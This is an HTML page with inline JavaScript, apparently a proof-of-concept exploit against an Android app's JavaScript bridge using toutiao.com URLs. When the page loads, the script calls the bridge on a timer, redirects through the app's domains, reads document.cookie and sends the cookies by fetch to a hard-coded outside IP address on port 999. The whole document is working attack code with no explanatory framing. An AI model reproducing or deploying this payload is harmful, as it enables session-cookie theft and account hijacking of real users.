<html>

<head>
    <title>JSBridge Dilrevx</title>
    <script type="text/javascript">
        const checkUrl = "https://app.toutiao.com?url="
        const cookieUrl = "https://m.toutiao.com?url="
        const myUrl = "http://47.121.200.18:999?url="

        const OPCODE_SET_URL = String(0)
        const OPCODE_GET_COOKIE = String(1)
        async function handleAndroidResult(opCode) {
            switch (opCode) {
                case OPCODE_SET_URL:
                    // the browser initiated navigation is the link in url= parameter
                    location.href = cookieUrl
                    break

                case OPCODE_GET_COOKIE:
                    const cookies = document.cookie
                    await fetch(myUrl + "&cookie=" + cookies)

                    break
                default:
                    document.location.href = myUrl + "&cookie=" + "default"
            }
        }
        function main() {
            setTimeout(() => jsb.base64Decode(btoa(OPCODE_SET_URL)), 100)
            setTimeout(() => jsb.base64Decode(btoa(OPCODE_GET_COOKIE)), 1000)

            location.href = cookieUrl + checkUrl

            // jsb.base64Decode(btoa(OPCODE_GET_COOKIE))

        }
        main()
    </script>
</head>

<body>
    <h1>JSBridge Dilrevx</h1>
    <button onclick="main()">Invoke Android Function</button>
    <div id="resultDiv" style="margin-top:20px;"></div>
</body>

</html>